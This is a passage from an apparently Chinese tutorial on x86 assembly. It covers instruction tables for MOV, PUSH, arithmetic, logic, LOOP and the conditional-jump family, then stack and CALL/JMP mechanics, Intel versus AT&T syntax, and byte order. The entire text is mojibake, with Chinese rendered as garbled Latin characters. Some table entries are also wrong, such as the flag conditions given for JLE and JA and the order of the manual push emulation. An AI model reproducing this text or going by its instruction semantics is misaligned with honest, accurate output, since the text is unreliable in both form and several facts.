ä¸‹çš„æ±‡ç¼–è¯­æ³•æ˜¯æœ‰äº›ä¸åŒçš„ï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘ä»¬å…ˆé€šè¿‡ windows ä¸‹çš„æ±‡ç¼–æŒ‡ä»¤æ¥ç®€å•å­¦ä¹ ä¸€ä¸‹ï¼Œåç»­å†æ¥æ¯”è¾ƒä¸¤è€…çš„ä¸åŒã€‚ 6.1 æ•°æ®ä¼ é€æŒ‡ä»¤ æŒ‡ä»¤ åç§° ç¤ºä¾‹ å¤‡æ³¨ MOV ä¼ é€æŒ‡ä»¤ MOV dest, src å°†æ•°æ®ä»srcç§»åŠ¨åˆ°dest PUSH è¿›æ ˆæŒ‡ä»¤ PUSH src æŠŠæºæ“ä½œæ•°srcå‹å…¥å †æ ˆ POP å‡ºæ ˆæŒ‡ä»¤ POP dest ä»æ ˆé¡¶å¼¹å‡ºå­—æ•°æ®åˆ°dest 6.2 ç®—æœ¯è¿ç®—æŒ‡ä»¤ æŒ‡ä»¤ åç§° ç¤ºä¾‹ å¤‡æ³¨ ADD åŠ æ³•æŒ‡ä»¤ ADD dest, src åœ¨deståŸºç¡€ä¸ŠåŠ src SUB å‡æ³•æŒ‡ä»¤ SUB dest, src åœ¨deståŸºç¡€ä¸Šå‡src INC åŠ 1æŒ‡ä»¤ INC dest åœ¨deståŸºç¡€ä¸ŠåŠ 1 DEC å‡1æŒ‡ä»¤ DEC dest åœ¨deståŸºç¡€ä¸Šå‡1 6.3 é€»è¾‘è¿ç®—æŒ‡ä»¤ æŒ‡ä»¤ åç§° ç¤ºä¾‹ å¤‡æ³¨ NOT å–åè¿ç®—æŒ‡ä»¤ NOT dest æŠŠæ“ä½œæ•°destæŒ‰ä½å–å AND ä¸è¿ç®—æŒ‡ä»¤ AND dest, src æŠŠdestå’Œsrcè¿›è¡Œä¸è¿ç®—ä¹‹åé€å›dest OR æˆ–è¿ç®—æŒ‡ä»¤ OR dest, src æŠŠdestå’Œsrcè¿›è¡Œæˆ–è¿ç®—ä¹‹åé€å›dest XOR å¼‚æˆ–è¿ç®— XOR dest, src æŠŠdestå’Œsrcè¿›è¡Œå¼‚æˆ–è¿ç®—ä¹‹åé€å›dest 6.4 å¾ªç¯æ§åˆ¶æŒ‡ä»¤ æŒ‡ä»¤ åç§° ç¤ºä¾‹ å¤‡æ³¨ LOOP è®¡æ•°å¾ªç¯æŒ‡ä»¤ LOOP label ä½¿ECXçš„å€¼å‡1ï¼Œå½“ECXçš„å€¼ä¸ä¸º0çš„æ—¶å€™è·³è½¬è‡³labelï¼Œå¦åˆ™æ‰§è¡ŒLOOPä¹‹åçš„è¯­å¥ 6.5 è½¬ç§»æŒ‡ä»¤ æŒ‡ä»¤ åç§° ç¤ºä¾‹ å¤‡æ³¨ JMP æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤ JMP lable æ— æ¡ä»¶åœ°è½¬ç§»åˆ°æ ‡å·ä¸ºlabelçš„ä½ç½® CALL è¿‡ç¨‹è°ƒç”¨æŒ‡ä»¤ CALL labal ç›´æ¥è°ƒç”¨label JE æ¡ä»¶è½¬ç§»æŒ‡ä»¤ JE lable zf =1 æ—¶è·³è½¬åˆ°æ ‡å·ä¸ºlabelçš„ä½ç½® JNE æ¡ä»¶è½¬ç§»æŒ‡ä»¤ JNE lable zf=0 æ—¶è·³è½¬åˆ°æ ‡å·ä¸ºlabelçš„ä½ç½® 6.6 JCCæŒ‡ä»¤ç»„ Jæ˜¯æŒ‡jumpã€‚CCæ˜¯æ¡ä»¶ï¼Œè¯¥æ¡ä»¶ä¸EFLæ ‡å¿—å¯„å­˜å™¨ä¸­çš„æ ‡å¿—ä½æ¯æ¯ç›¸å…³ã€‚é€šè¿‡è·å–EFLæ ‡å¿—ä½çš„å€¼ï¼Œåˆ¤æ–­æ˜¯å¦æ»¡è¶³æ¡ä»¶è€Œæ˜¯å¦æ‰§è¡ŒJUMPæ“ä½œã€‚å¯¹åº”äº†é«˜çº§è¯­è¨€ä¸­çš„æ¯”è¾ƒè¿ç®—ã€‚ JCCæŒ‡ä»¤ ä¸­æ–‡å«ä¹‰ æ£€æŸ¥ç¬¦å·ä½ å…¸å‹Cåº”ç”¨ JZ/JE è‹¥ä¸º0åˆ™è·³è½¬ï¼›è‹¥ç›¸ç­‰åˆ™è·³è½¬ ZF=1 if (i == j);if (i == 0); JNZ/JNE è‹¥ä¸ä¸º0åˆ™è·³è½¬ï¼›è‹¥ä¸ç›¸ç­‰åˆ™è·³è½¬ ZF=0 if (i != j);if (i != 0); JS è‹¥ä¸ºè´Ÿåˆ™è·³è½¬ SF=1 if (i &lt; 0); JNS è‹¥ä¸ºéè´Ÿæ•°åˆ™è·³è½¬ SF=0 if (i &gt;= 0); JP/JPE è‹¥1å‡ºç°æ¬¡æ•°ä¸ºå¶æ•°åˆ™è·³è½¬ PF=1 (null) JNP/JPO è‹¥1å‡ºç°æ¬¡æ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬ PF=0 (null) JO è‹¥æº¢å‡ºåˆ™è·³è½¬ OF=1 (null) JNO è‹¥æ— æº¢å‡ºåˆ™è·³è½¬ OF=0 (null) JC/JB/JNAE è‹¥è¿›ä½åˆ™è·³è½¬ï¼›è‹¥ä½äºåˆ™è·³è½¬ï¼›è‹¥ä¸é«˜äºç­‰äºåˆ™è·³è½¬ CF=1 if (i &lt; j); JNC/JNB/JAE è‹¥æ— è¿›ä½åˆ™è·³è½¬ï¼›è‹¥ä¸ä½äºåˆ™è·³è½¬ï¼›è‹¥é«˜äºç­‰äºåˆ™è·³è½¬ï¼› CF=0 if (i &gt;= j); JBE/JNA è‹¥ä½äºç­‰äºåˆ™è·³è½¬ï¼›è‹¥ä¸é«˜äºåˆ™è·³è½¬ ZF=1æˆ–CF=1 if (i &lt;= j); JNBE/JA è‹¥ä¸ä½äºç­‰äºåˆ™è·³è½¬ï¼›è‹¥é«˜äºåˆ™è·³è½¬ ZF=0æˆ–CF=0 if (i &gt; j); JL/JNGE è‹¥å°äºåˆ™è·³è½¬ï¼›è‹¥ä¸å¤§äºç­‰äºåˆ™è·³è½¬ SF != OF if (si &lt; sj); JNL/JGE è‹¥ä¸å°äºåˆ™è·³è½¬ï¼›è‹¥å¤§äºç­‰äºåˆ™è·³è½¬ï¼› SF = OF if (si &gt;= sj); JLE/JNG è‹¥å°äºç­‰äºåˆ™è·³è½¬ï¼›è‹¥ä¸å¤§äºåˆ™è·³è½¬ ZF != OF æˆ– ZF=1 if (si &lt;= sj); JNLE/JG è‹¥ä¸å°äºç­‰äºåˆ™è·³è½¬ï¼›è‹¥å¤§äºåˆ™è·³è½¬ SF=0F ä¸” ZF=0 if(si&gt;sj)ag 6.7 å †æ ˆæŒ‡ä»¤ ESPï¼šæ ˆé¡¶æŒ‡é’ˆå¯„å­˜å™¨ï¼Œè®°å½•å½“å‰ä½¿ç”¨çš„åœ°å€ï¼Œæ ˆçš„å†…å­˜ç©ºé—´æ˜¯å­˜å¤§åœ°å€å¼€å§‹ä½¿ç”¨çš„ã€‚EBPï¼šæ ˆåº•æŒ‡é’ˆå¯„å­˜å™¨ï¼Œè®°å½•æ ˆå¼€å§‹çš„ä½ç½®ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨MOVæŒ‡ä»¤ï¼Œå°†æ•°æ®MOVåˆ°ESPå¯„å­˜å™¨æŒ‡å®šçš„ä½ç½®ï¼Œç„¶åä½¿ç”¨SUBæˆ–è€…ADDæŒ‡ä»¤ï¼Œå°†ESPå¯„å­˜å™¨çš„å€¼åç§»å¯¹åº”çš„æ•°æ®å®½åº¦å€¼ï¼Œå®ç°æ•°æ®çš„å…¥æ ˆå’Œå‡ºæ ˆæ“ä½œã€‚åŸºäºè¿™æ ·çš„åŸç†ï¼Œæ±‡ç¼–ä¸­æä¾›äº†PUSHå’ŒPOPå‘½ä»¤ MOV BYTE PTR DS:[ESP], 0xFF // å‘æ ˆä¸­å†™å…¥ä¸€ä¸ªå­—èŠ‚ SUB ESP, 1 // æ ˆé¡¶æŒ‡é’ˆåç§»ä¸€å­—èŠ‚ ä»¥ä¸Šä¸¤ä¸ªæ“ä½œç­‰åŒäºä¸€ä¸ªpushæ“ä½œ PUSH 0xFF // å°†0xFFå†™å…¥åˆ°ESPä¿å­˜çš„åœ°å€å¤„ï¼ŒåŒæ—¶ESPåç§»ä¸€ä¸ªæ•°æ®å®½åº¦ PUSH EAX // EAXä¸­çš„å€¼å…¥æ ˆ PUSH DWORD PTR DS:[åœ°å€] // è¯¥åœ°å€å¤„çš„å€¼å…¥æ ˆ å‡ºæ ˆåŒç† POP DWORDã€€EAX // å°†æ ˆé¡¶çš„å…ƒç´ å–å‡ºæ”¾å…¥EAXå¯„å­˜å™¨ä¸­ä¿å­˜ï¼ŒåŒæ—¶ESPåç§»ä¸€ä¸ªDWORDæ•°æ®å®½åº¦ 6.8 è·³è½¬æŒ‡ä»¤ JMPï¼šå°†ç¨‹åºè·³è½¬åˆ°æŒ‡å®šçš„åœ°å€æ‰§è¡Œï¼Œé€šè¿‡æ”¹å˜EIPä¸­çš„å€¼å®ç° CALLï¼šå°†ç¨‹åºè·³è½¬åˆ°æŒ‡å®šçš„åœ°å€ï¼Œè·³è½¬å‰å°†ä¸‹ä¸€æ¬¡æ‰§è¡Œçš„åœ°å€ä¿å­˜åˆ°æ ˆä¸­ï¼Œç”¨æ¥è®°å½•è·³è½¬å‰çš„ä½ç½®ã€‚ç„¶åæ”¹å˜EIPä¸­çš„å€¼ä½¿å¾—cpuå»æ‰§è¡Œå…¶ä»–åœ°å€çš„æŒ‡ä»¤ã€‚å½“æ‰§è¡Œç»“æŸéœ€è¦è¿”å›åŸæ¥çš„åœ°å€æ—¶ï¼Œä»æ ˆä¸­å–å‡ºè·³è½¬ç­¾åˆ°çš„åœ°å€ï¼Œèµ‹å€¼åˆ°EIPå¯„å­˜å™¨ä¸­å³å¯å›åˆ°è·³è½¬å‰çš„çŠ¶æ€ã€‚ RETNï¼šä»æ ˆä¸­å–å‡ºä¿å­˜çš„åœ°å€ï¼Œèµ‹å€¼ç»™EIPï¼Œç”¨ä½œä¸‹æ¬¡æ‰§è¡Œ ä½¿ç”¨è¿™ä¸¤ä¸ªæŒ‡ä»¤éœ€è¦ç†è§£EIPå¯„å­˜å™¨çš„ä½œç”¨ã€‚å½“ä¸€ä¸ªç¨‹åºè¢«ç¼–è¯‘å®Œæˆä¹‹åï¼Œç¨‹åºçš„æ‰§è¡Œæ–¹æ³•å³å·²ç»ç¡®å®šï¼Œå³A=&gt;B=&gt;Cçš„é¡ºåºè¿›è¡Œæ‰§è¡Œï¼Œä¸”ä»–ä»¬ä½¿ç”¨çš„å†…å­˜ç©ºé—´è¯´è¿ç»­çš„ï¼Œè®¡ç®—æœºæ‰§è¡Œä¸€è¡ŒæŒ‡ä»¤åï¼Œä¸‹ä¸€æ¬¡è¦æ‰§è¡Œçš„å†…å®¹éƒ½ä¿å­˜åœ¨EIPå¯„å­˜å™¨ä¿å­˜çš„åœ°å€å¤„ã€‚æ‰€ä»¥EIPå¯„å­˜å™¨æŒ‡å‘çš„å†…å®¹ï¼Œå°±æ˜¯ç¨‹åºä¸‹ä¸€æ¬¡æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒAæ‰§è¡Œæ—¶ï¼ŒEIPå¯„å­˜å™¨ä¸­ä¿å­˜çš„æ˜¯Bçš„åœ°å€ï¼Œè¿™æ ·æ‰§è¡ŒAåå°†ä¼šè·å–Bçš„ä¿¡æ¯å¹¶æ‰§è¡Œã€‚å¦‚æœAæ˜¯ä¸€ä¸ªJMPæˆ–è€…CALLæŒ‡ä»¤ï¼Œæ‰§è¡Œä¾æ¬¡JMP EIP Dï¼Œè¿™æ¡æŒ‡ä»¤è¡¨ç¤ºå°†EIPä¸­çš„å€¼æ”¹ä¸ºDçš„åœ°å€ï¼Œæ‰€ä»¥ä¸‹ä¸€æ¬¡æ‰§è¡Œçš„å³ä¸ºDæŒ‡ä»¤ã€‚ç”±æ­¤å®ç°äº†è·³è½¬ã€‚è¿™æ ·çš„æ–¹å¼å½“ç¨‹åºè·³è½¬åˆ°DæŒ‡ä»¤åï¼Œç¨‹åºæ— æ³•è¿”å›BæŒ‡ä»¤äº†ï¼Œå› ä¸ºæˆ‘ä»¬æ‰¾ä¸åˆ°Bçš„åœ°å€ï¼Œæƒ³è¦é‡æ–°å›åˆ°BæŒ‡ä»¤ï¼Œéœ€è¦å°†Bçš„åœ°å€ä¿å­˜ï¼Œä½¿ç”¨æ—¶å–å›å³å¯ï¼Œé€šå¸¸æ˜¯å°†å…¶å…¥æ ˆã€‚è¿™æ ·å°±å’ŒCALLæŒ‡ä»¤çš„ä½¿ç”¨æ–¹å¼ç›¸åŒäº†ã€‚ JMP EIP, åœ°å€ // ä¿®æ”¹EIPå¯„å­˜å™¨ä¸­çš„å€¼ã€‚ CALLã€€åœ°å€ // è·³è½¬åˆ°æŒ‡å®šåœ°å€ï¼Œæ‰§è¡Œè¯¥åœ°å€çš„æŒ‡ä»¤ï¼Œè·³è½¬å‰ï¼Œå°†ä¸‹ä¸€è¡Œåœ°å€å…¥æ ˆï¼Œ 0x07 linux å’Œ windows ä¸‹æ±‡ç¼–çš„åŒºåˆ« å‰é¢è¯´åˆ° linux å’Œ windows ä¸‹çš„æ±‡ç¼–è¯­æ³•æ˜¯ä¸åŒçš„ï¼Œå…¶å®ä¸¤ç§è¯­æ³•çš„ä¸åŒå’Œç³»ç»Ÿä¸åŒæ²¡æœ‰ç»å¯¹çš„å…³ç³»ï¼Œä¸€èˆ¬åœ¨ linux ä¸Šä¼šä½¿ç”¨ gcc/g++ ç¼–è¯‘å™¨ï¼Œè€Œåœ¨ windows ä¸Šä¼šä½¿ç”¨å¾®è½¯çš„ cl ä¹Ÿå°±æ˜¯ MSBUILDï¼Œæ‰€ä»¥äº§ç”Ÿä¸åŒçš„ä»£ç æ˜¯å› ä¸ºç¼–è¯‘å™¨ä¸åŒï¼Œgcc ä¸‹é‡‡ç”¨çš„æ˜¯AT&amp;Tçš„æ±‡ç¼–è¯­æ³•æ ¼å¼ï¼ŒMSBUILD é‡‡ç”¨çš„æ˜¯Intelæ±‡ç¼–è¯­æ³•æ ¼å¼ã€‚ å·®å¼‚ Intel AT&amp;T å¼•ç”¨å¯„å­˜å™¨åå­— eax %eax èµ‹å€¼æ“ä½œæ•°é¡ºåº mov dest, src movl src, dest å¯„å­˜å™¨ã€ç«‹å³æ•°æŒ‡ä»¤å‰ç¼€ mov ebx, 0xd00d movl $0xd00d, %ebx å¯„å­˜å™¨é—´æ¥å¯»å€ [eax] (%eax) æ•°æ®ç±»å‹å¤§å° æ“ä½œç ååŠ åç¼€å­—æ¯ï¼Œâ€œlâ€ 32ä½ï¼Œâ€œwâ€ 16ä½ï¼Œâ€œbâ€ 8ä½ï¼ˆmov dx, word ptr [eax]ï¼‰ æ“ä½œæ•°å‰é¢åŠ dword ptrï¼Œ word ptrï¼Œbyte ptrçš„æ ¼å¼ ï¼ˆmovb %bl %alï¼‰ 0x08 ä»€ä¹ˆæ˜¯å­—é•¿ â€‹ å†…å­˜ä»¥å­—èŠ‚ä¸ºå•ä½ã€‚ ä¸€ä¸ªå­—èŠ‚æ˜¯ 8 ä¸ªæ¯”ç‰¹ä½ï¼Œå¯ä»¥è¡¨ç¤º 2^8 = 256 ä¸ªæ•°ã€‚å¤§å°ä¸º 8 ä½çš„äºŒè¿›åˆ¶æ•°æ˜¯ä» 0 å¼€å§‹åˆ° 255 è¿™ 256 ä¸ªå€¼ä¸­çš„ä¸€ä¸ªã€‚ ä¸¤ä¸ªå­—èŠ‚è¢«ç§°ä¸ºä¸€ä¸ªå­—ï¼ˆWORDï¼‰ï¼Œä¸¤ä¸ªå­—è¢«ç§°ä¸ºå››ä¸ªå­—èŠ‚ï¼ˆ32ä½ï¼‰ä¹Ÿå³åŒå­—ï¼ˆDWORDï¼‰ï¼Œå››å­— ï¼ˆQWORDï¼‰æ˜¯å…«ä¸ªå­—èŠ‚ï¼ˆ64 ä½ï¼‰ã€‚ è¿™äº›è¿ç»­çš„å­—èŠ‚è¦æŒ‰ä»€ä¹ˆæ ·çš„é¡ºåºæ’åˆ—å’Œè§£é‡Šï¼Œè¿™å°±æ¶‰åŠåˆ°ç«¯åºçš„èŒƒç•´äº†ã€‚ å­—èŠ‚çš„æ’åˆ—æ–¹å¼æœ‰ä¸¤ä¸ªé€šç”¨è§„åˆ™: å¤§ç«¯åºï¼ˆBig-Endianï¼‰ä¸å°ç«¯åºï¼ˆLittle-Endianï¼‰ å¤§ç«¯åºï¼ˆBig-Endianï¼‰å°†æ•°æ®çš„ä½ä½å­—èŠ‚å­˜æ”¾åœ¨å†…å­˜çš„é«˜ä½åœ°å€ï¼Œé«˜ä½å­—èŠ‚å­˜æ”¾åœ¨ä½ä½åœ°å€ã€‚è¿™ç§ æ’åˆ—æ–¹å¼ä¸æ•°æ®ç”¨å­—èŠ‚è¡¨ç¤ºæ—¶çš„ä¹¦å†™é¡ºåºä¸€è‡´ï¼Œç¬¦åˆäººç±»çš„é˜…è¯»ä¹ æƒ¯ã€‚ å°ç«¯åºï¼ˆLittle-Endianï¼‰å°†æ•°æ®çš„ä½ä½å­—èŠ‚æ”¾åœ¨è¾ƒå°çš„åœ°å€å¤„ï¼Œé«˜ä½æ”¾åœ¨è¾ƒå¤§çš„åœ°å€å¤„ã€‚å°ç«¯åºä¸ äººç±»çš„é˜…è¯»ä¹ æƒ¯ç›¸åï¼Œä½†æ›´ç¬¦åˆè®¡ç®—æœºè¯»å–å†…å­˜çš„æ–¹å¼ï¼Œå› ä¸ºCPUè¯»å–å†…å­˜ä¸­çš„æ•°æ®æ—¶ï¼Œæ˜¯ä»ä½åœ° å€å‘é«˜åœ°å€æ–¹å‘è¿›è¡Œè¯»å–çš„ã€‚ 0x09 å¤§ç«¯ä¸å°ç«¯çš„æ¯”è¾ƒ 9.1 æ¦‚å¿µ å­—èŠ‚åºæŒ‡çš„æ˜¯ï¼Œå¤šå­—èŠ‚æ•°æ®çš„å†…å­˜æ’åˆ—é¡ºåºã€‚è¿™æ ·è¯´æ¯”è¾ƒæŠ½è±¡ï¼Œä½¿ç”¨å›¾å½¢è§£é‡Šå°±å¾ˆå¥½æ‡‚ã€‚ å†…å­˜å¥½æ¯”ä¸€æ’æˆ¿é—´ï¼Œæ¯ä¸ªå­—èŠ‚æ˜¯ä¸€é—´æˆ¿ã€‚æ¯é—´æˆ¿éƒ½æœ‰é—¨ç‰Œå·ï¼ˆå†…å­˜åœ°å€ï¼‰ï¼Œä»0å·å¼€å§‹ï¼Œç„¶åæ˜¯1å·ã€2å·â€¦ 0å·å­—èŠ‚çš„åœ°å€å°ï¼Œç§°ä¸ºä½ä½å†…å­˜ï¼›3å·å­—èŠ‚çš„åœ°å€å¤§ï¼Œç§°ä¸ºé«˜ä½å†…å­˜ã€‚ ç°åœ¨æœ‰ä¸€ä¸ªæ•°å€¼abcdè¦æ”¾è¿›è¿™äº›æˆ¿é—´ï¼Œæ¯ä¸ªæˆ¿é—´æ”¾ä¸€ä¸ªæ•°å­—ï¼Œé‚£ä¹ˆæœ‰ä¸¤ç§æ”¾æ³•ã€‚ ç¬¬ä¸€ç§æ”¾æ³•æ˜¯ï¼Œç¬¬ä¸€ä½aæ”¾åœ¨ä½ä½åœ°å€ï¼ˆ0å·ï¼‰ï¼Œæœ€åä¸€ä½dæ”¾åœ¨é«˜ä½åœ°å€ï¼ˆ3å·ï¼‰ã€‚ è¿™ç§æ’åˆ—ç§°ä¸º\"å¤§ç«¯åº\"ï¼ˆbig-endianï¼Œç®€ç§° BEï¼‰ï¼Œå³å¤§å¤´åœ¨å‰ï¼Œå› ä¸ºaæ˜¯abcdçš„å¤§å¤´ï¼ˆæœ€é‡è¦çš„æ•°å­—ï¼‰ã€‚ ç¬¬äºŒç§æ”¾æ³•æ˜¯ï¼Œç¬¬ä¸€ä½aæ”¾åœ¨é«˜ä½åœ°å€ï¼ˆ3å·åœ°å€ï¼‰ï¼Œæœ€åä¸€ä½dæ”¾åœ¨ä½ä½åœ°å€ï¼ˆ0å·åœ°å€ï¼‰ã€‚ è¿™ç§æ’åˆ—ç§°ä¸º\"å°ç«¯åº\"ï¼ˆlittle-endianï¼Œç®€ç§° LEï¼‰ï¼Œå³å°å¤´dåœ¨å‰ã€‚ å¤§ç«¯åºå’Œå°ç«¯åºåˆç§°å­—èŠ‚åºï¼Œè¿™ä¸¤ä¸ªåå­—æ¥è‡ª18ä¸–çºªçš„è‹±å›½å°è¯´ã€Šæ ¼åˆ—ä½›æ¸¸è®°ã€‹ã€‚æŸå›½åˆ†æˆä¸¤æ´¾ï¼Œä¸€æ´¾è®¤ä¸ºé¸¡è›‹åº”è¯¥ä»å¤§å¤´åƒèµ·ï¼Œç§°ä¸º\"å¤§ç«¯æ´¾\"ï¼›å¦ä¸€æ´¾è®¤ä¸ºï¼Œé¸¡è›‹åº”è¯¥ä»å°å¤´åƒèµ·ï¼Œç§°ä¸º\"å°ç«¯æ´¾\"ã€‚ä¸¤æ´¾ç›¸æ‰§ä¸ä¸‹ï¼Œè°ä¹Ÿæ— æ³•è¯´æœè°ï¼Œæœ€åç”šè‡³ä¸ºæ­¤äº¤æˆ˜ã€‚ 9.2 å¯è¯»æ€§ å¯¹äºäººç±»æ¥è¯´ï¼Œä¸åŒå­—èŠ‚åºçš„å¯è¯»æ€§æ˜¯ä¸ä¸€æ ·çš„ã€‚å¤§éƒ¨åˆ†å›½å®¶çš„é˜…è¯»ä¹ æƒ¯æ˜¯ä»å·¦åˆ°å³é˜…è¯»ã€‚ å¤§ç«¯åºçš„æœ€é«˜ä½åœ¨å·¦è¾¹ï¼Œæœ€ä½ä½åœ¨å³è¾¹ï¼Œç¬¦åˆé˜…è¯»ä¹ æƒ¯ã€‚æ‰€ä»¥ï¼Œå¯¹äºè¿™äº›å›½å®¶çš„äººæ¥è¯´ï¼Œä»å·¦åˆ°å³çš„å¤§ç«¯åºçš„å¯è¯»æ€§æ›´å¥½ã€‚ ä½†æ˜¯ç°å®ä¸­ï¼Œä»å³åˆ°å·¦çš„å°ç«¯åºè™½ç„¶å¯è¯»æ€§å·®ï¼Œä½†åº”ç”¨æ›´å¹¿æ³›ï¼Œx86 å’Œ ARM è¿™ä¸¤ç§ CPU æ¶æ„éƒ½é‡‡ç”¨å°ç«¯åºï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ æˆ–è€…æ¢ä¸€ç§é—®æ³•ï¼Œä¸¤ç§ä¸åŒçš„å­—èŠ‚åºä¸ºä»€ä¹ˆä¼šå¹¶å­˜ï¼Œç»Ÿä¸€è§„å®šåªä½¿ç”¨ä¸€ç§ï¼Œéš¾é“ä¸æ˜¯æ›´æ–¹ä¾¿å—ï¼Ÿ åŸå› æ˜¯å®ƒä»¬æœ‰å„è‡ªçš„é€‚ç”¨åœºæ™¯ï¼ŒæŸäº›åœºæ™¯å¤§ç«¯åºæœ‰ä¼˜åŠ¿ï¼Œå¦ä¸€äº›åœºæ™¯å°ç«¯åºæœ‰ä¼˜åŠ¿ï¼Œä¸‹é¢å°±é€ä¸€åˆ†æã€‚ 9.3 æ£€æŸ¥å¥‡å¶æ€§ å°ç«¯åºä¼˜åŠ¿æœ€æ˜æ˜¾çš„ï¼Œå¤§æ¦‚å°±æ˜¯æ£€æŸ¥å¥‡å¶æ€§ï¼Œå³é€šè¿‡æŸ¥çœ‹ä¸ªä½æ•°ï¼Œç¡®å®šæŸä¸ªæ•°å­—æ˜¯å¥‡æ•°è¿˜æ˜¯å¶æ•°ã€‚ ä»¥123456ä¸ºä¾‹ï¼Œå¤§ç«¯åºä»å·¦åˆ°å³æ’åˆ—ï¼Œè®¡ç®—æœºå¿…é¡»ä¸€ç›´è¯»åˆ°æœ€åä¸€ä½çš„ä¸ªä½æ•°6ï¼Œæ‰èƒ½ç¡®å®šè¿™æ˜¯å¶æ•°ã€‚ å°ç«¯åºæ˜¯ä»å³åˆ°å·¦æ’åˆ—ï¼Œä¸ªä½æ•°åœ¨ç¬¬ä¸€ä½ã€‚æ‰€ä»¥ï¼Œåªè¦è¯»å–ç¬¬ä¸€ä½ï¼Œå°±èƒ½ç¡®å®šå®ƒæ˜¯å¶æ•°ã€‚ 9.4 æ£€æŸ¥æ­£è´Ÿå· ä¸€ä¸ªç±»ä¼¼çš„åœºæ™¯æ˜¯æ£€æŸ¥æ­£è´Ÿå·ï¼Œç¡®å®šä¸€ä¸ªæ•°æ˜¯æ­£æ•°è¿˜æ˜¯è´Ÿæ•°ã€‚ å¤§ç«¯åºçš„ç¬¦å·ä½åœ¨å·¦è¾¹ç¬¬ä¸€ä½ï¼Œå°ç«¯åºçš„ç¬¦å·ä½åœ¨å³è¾¹æœ€åä¸€ä½ã€‚æ‰€ä»¥ï¼Œå¤§ç«¯åºæœ‰ä¼˜åŠ¿ï¼Œåªçœ‹ç¬¬ä¸€ä½å°±èƒ½çŸ¥é“æ˜¯ä¸æ˜¯è´Ÿæ•°ã€‚ 9.5 æ¯”è¾ƒå¤§å° ä¸‹ä¸€ä¸ªæ“ä½œæ˜¯æ¯”è¾ƒå¤§å°ã€‚ç°åœ¨æœ‰ä¸‰ä¸ªæ•°å­—ï¼Œéœ€è¦æ¯”è¾ƒå¤§å°ï¼š43662576ï¼Œ594ï¼Œ2ã€‚ ä¸Šå›¾æ˜¯å¤§ç«¯åºæ’åˆ—ï¼Œå› ä¸ºæ˜¯ä»å·¦åˆ°å³æ’åˆ—ï¼Œæ‰€ä»¥ä¸‰ä¸ªæ•°å­—åœ¨å³è¾¹ä¸ªä½æ•°å¯¹é½ã€‚æ¯”è¾ƒå¤§å°æ—¶ï¼Œè®¡ç®—æœºå°±ä¸å¾—ä¸è¯»å–æ¯ä¸€ä¸ªæ•°çš„æ‰€æœ‰ä½ï¼Œç›´åˆ°ä¸ªä½æ•°ï¼Œå†è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœæ”¹æˆå°ç«¯åºï¼Œå°±æ˜¯ä¸‹é¢çš„æ’åˆ—æ–¹å¼ã€‚ å°ç«¯åºæ˜¯ä»å³åˆ°å·¦ï¼Œæ‰€ä»¥ä¸‰ä¸ªæ•°å­—åœ¨ç¬¬ä¸€ä½å¯¹é½ã€‚è®¡ç®—æœºå°±ä¸éœ€è¦è¯»å–æ‰€æœ‰ä½ï¼Œå“ªä¸ªæ•°å­—å…ˆè¯»ä¸åˆ°ä¸‹ä¸€ä½ï¼Œå°±æ˜¯æœ€å°çš„ã€‚æ¯”å¦‚ï¼Œ2è¿™ä¸ªæ•°å­—å°±æ²¡æœ‰ç¬¬äºŒä½ï¼Œæ‰€ä»¥è¯»åˆ°ç¬¬äºŒä½æ—¶ï¼Œå°±çŸ¥é“å®ƒæ˜¯æœ€å°çš„ã€‚ æ‰€ä»¥ï¼Œæ¯”è¾ƒå¤§å°æ—¶ï¼Œå°ç«¯åºæœ‰ä¼˜åŠ¿ã€‚ 9.6 ä¹˜æ³• æ¥ä¸‹æ¥ï¼Œå†çœ‹ä¹˜æ³•æ“ä½œã€‚ ä¹˜æ³•æ˜¯é€ä½ç›¸ä¹˜ï¼Œæ¯ä¸€è½®ä¹˜æ³•éƒ½è¦å‘å‰è¿›ä½ã€‚ ä¸Šå›¾æ˜¯å¤§ç«¯åºçš„24165ä¹˜ä»¥3841ã€‚å¤§ç«¯åºçš„ä¹˜æ³•æ˜¯å‘å·¦è¿›ä½ï¼Œä¹Ÿå°±æ˜¯å‘å·¦è¾¹æ‰©å±•ï¼Œå¿…é¡»ç­‰åˆ°æ¯ä¸€è½®çš„ç»“æœéƒ½å‡ºæ¥ï¼ˆä¸Šä¾‹æ˜¯å››è½®ï¼‰ï¼Œå†ç›¸åŠ ç»Ÿä¸€å†™å…¥å†…å­˜ã€‚ å¦‚æœæ”¹æˆå°ç«¯åºçš„ä¹˜æ³•ï¼Œå°±ä¸éœ€è¦ç­‰å¾…ä¸‹ä¸€è½®çš„ç»“æœï¼Œæ¯ä¸€è½®éƒ½å¯ä»¥ç›´æ¥å†™å…¥å†…å­˜ã€‚ ä¸Šå›¾æ˜¯å°ç«¯åºçš„24165ä¹˜ä»¥3841ã€‚å°ç«¯åºçš„ä¹˜æ³•æ˜¯å‘å³è¿›ä½ï¼Œä¹Ÿå°±æ˜¯å‘å³è¾¹æ‰©å±•ï¼Œå·¦è¾¹çš„è¾¹ç•Œä¸å˜ã€‚æ¯ä¸€è½®ç»“æœå†™å…¥å†…å­˜åï¼Œå°±ä¸éœ€è¦ç§»åŠ¨ï¼Œåé¢æœ‰å˜åŒ–åªéœ€è¦æ”¹åŠ¨å¯¹åº”çš„ä½å°±è¡Œäº†ã€‚ å› æ­¤ï¼Œå°ç«¯åºçš„ä¹˜æ³•æœ‰æ˜æ˜¾ä¼˜åŠ¿ã€‚ 9.7 ä»»æ„ç²¾åº¦æ•´æ•° ä¸Šä¸€ä¸ªä¾‹å­çš„ä»ä½ä½å¼€å§‹è®¡ç®—çš„ç‰¹æ€§ï¼Œå¯¹äºä»»æ„ç²¾åº¦æ•´æ•°ç‰¹åˆ«æœ‰ç”¨ã€‚ä»»æ„ç²¾åº¦æ•´æ•°åˆç§°å¤§æ•´æ•°ï¼Œå¯ä»¥å­˜æ”¾ä»»æ„å¤§å°çš„æ•´æ•°ã€‚ å®ƒçš„å†…éƒ¨å®ç°æ˜¯æŠŠæ•´æ•°åˆ†æˆä¸€ä¸ªä¸ªè¾ƒå°çš„å•ä½ï¼Œé€šå¸¸æ˜¯ 